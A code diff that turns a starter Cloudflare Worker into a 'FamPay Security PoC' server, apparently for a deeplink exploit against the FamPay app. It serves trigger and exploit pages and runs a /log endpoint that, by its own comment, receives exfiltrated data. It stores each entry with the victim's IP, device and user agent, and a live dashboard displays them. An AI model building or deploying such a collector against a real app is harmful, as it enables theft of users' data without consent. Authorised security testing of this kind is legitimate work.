@@ -1,23 +1,161 @@
 /**
- * Welcome to Cloudflare Workers! This is your first worker.
+ * FamPay Security PoC — Cloudflare Worker
+ * Internal Security Team — Do Not Distribute
  *
- * - Run `npm run dev` in your terminal to start a development server
- * - Open a browser tab at http://localhost:8787/ to see your worker in action
- * - Run `npm run deploy` to publish your worker
- *
- * Learn more at https://developers.cloudflare.com/workers/
+ * Routes:
+ *   /                → redirect to /trigger
+ *   /trigger         → trigger.html  (static via ASSETS)
+ *   /exploit         → exploit.html  (static via ASSETS)
+ *   /report          → report.html   (static via ASSETS)
+ *   /log             → receives callback data from exploit.html
+ *   /log-viewer      → live dashboard of received callbacks (auto-refresh 4s)
+ *   /log-clear       → clears in-memory log
  */
 
-export default {
-	async fetch(request, env, ctx) {
-		const url = new URL(request.url);
+// In-memory store — resets on worker restart/cold start.
+// For persistence add a Workers KV binding in wrangler.jsonc.
+const logs = [];
 
-		if (url.pathname === '/') {
-			return new Response("hello world");
-		}
-		if (url.pathname === '/trigger') {
-			return env.ASSETS.fetch(request);
-		}
+const CORS = {
+  'Access-Control-Allow-Origin': '*',
+  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+  'Access-Control-Allow-Headers': 'Content-Type',
+};
 
-	}
+function html(body, status = 200) {
+  return new Response(body, {
+    status,
+    headers: { ...CORS, 'Content-Type': 'text/html;charset=UTF-8' },
+  });
 }
+
+function json(data, status = 200) {
+  return new Response(JSON.stringify(data), {
+    status,
+    headers: { ...CORS, 'Content-Type': 'application/json' },
+  });
+}
+
+function escHtml(s) {
+  return String(s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+export default {
+  async fetch(request, env) {
+    const url  = new URL(request.url);
+    const path = url.pathname.replace(/\/+$/, '') || '/';
+
+    // CORS preflight
+    if (request.method === 'OPTIONS') {
+      return new Response(null, { status: 204, headers: CORS });
+    }
+
+    // /log — receives exfiltrated data from exploit.html
+    if (path === '/log') {
+      const tag  = url.searchParams.get('tag')  || 'unknown';
+      const data = url.searchParams.get('data') || '';
+      const t    = url.searchParams.get('t')    || Date.now();
+      const ip   = request.headers.get('cf-connecting-ip') || 'unknown';
+      const ua   = request.headers.get('user-agent') || '';
+
+      const entry = {
+        timestamp: new Date(Number(t) || Date.now()).toISOString(),
+        tag,
+        data: decodeURIComponent(data),
+        ip,
+        device: ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Other',
+        ua: ua.substring(0, 120),
+      };
+
+      logs.unshift(entry);
+      if (logs.length > 500) logs.pop();
+
+      console.log(`[POC] ${tag} | ${entry.ip} | ${entry.data.substring(0, 100)}`);
+
+      return json({ ok: true, received: tag });
+    }
+
+    // /log-viewer — live dashboard
+    if (path === '/log-viewer') {
+      const rows = logs.length
+        ? logs.map(l => `
+            <tr>
+              <td>${l.timestamp}</td>
+              <td><span class="tag">${escHtml(l.tag)}</span></td>
+              <td class="data">${escHtml(l.data)}</td>
+              <td>${l.ip}</td>
+              <td>${l.device}</td>
+            </tr>`).join('')
+        : '<tr><td colspan="5" class="empty">No callbacks yet — fire the deeplink first.</td></tr>';
+
+      return html(`<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="refresh" content="4">
+<title>Log Viewer — FamPay PoC</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px;font-size:12px}
+  h2{color:#00e676;margin-bottom:4px;font-size:16px}
+  .meta{color:#666;font-size:11px;margin-bottom:18px}
+  .meta a{color:#448aff;margin-right:12px}
+  .meta a.clear{color:#ff1744}
+  table{width:100%;border-collapse:collapse}
+  th{background:#13131a;color:#448aff;padding:8px 10px;text-align:left;border-bottom:1px solid #2a2a3a;font-size:11px}
+  td{padding:8px 10px;border-bottom:1px solid #1a1a2a;vertical-align:top}
+  td.data{word-break:break-all;max-width:340px;color:#00e676;font-size:11px}
+  tr:hover td{background:#13131a}
+  .tag{background:#1a1a2a;border:1px solid #2a2a3a;padding:2px 7px;border-radius:10px;color:#ffea00;font-size:10px}
+  .empty{text-align:center;color:#555;padding:30px}
+  .count{color:#ffea00;font-weight:bold}
+</style></head>
+<body>
+<h2>&#128225; Callback Log Viewer</h2>
+<div class="meta">
+  Auto-refreshes every 4s &nbsp;·&nbsp; <span class="count">${logs.length}</span> entries
+  &nbsp;·&nbsp; <a href="/trigger">&#8592; Trigger</a>
+  <a href="/log-clear" class="clear">&#128465; Clear logs</a>
+</div>
+<table>
+  <thead>
+    <tr><th>Timestamp</th><th>Tag</th><th>Data</th><th>IP</th><th>Device</th></tr>
+  </thead>
+  <tbody>${rows}</tbody>
+</table>
+</body></html>`);
+    }
+
+    // /log-clear
+    if (path === '/log-clear') {
+      logs.length = 0;
+      return Response.redirect(new URL('/log-viewer', url).href, 302);
+    }
+
+    // / → redirect to trigger
+    if (path === '/') {
+      return Response.redirect(new URL('/trigger', url).href, 302);
+    }
+
+    // Static pages served from public/ via ASSETS binding
+    const staticRoutes = {
+      '/trigger':      '/trigger.html',
+      '/trigger.html': '/trigger.html',
+      '/exploit':      '/exploit.html',
+      '/exploit.html': '/exploit.html',
+      '/report':       '/report.html',
+      '/report.html':  '/report.html',
+    };
+
+    if (staticRoutes[path]) {
+      const assetReq = new Request(new URL(staticRoutes[path], url).href, request);
+      return env.ASSETS.fetch(assetReq);
+    }
+
+    return new Response('Not found', { status: 404, headers: CORS });
+  },
+};
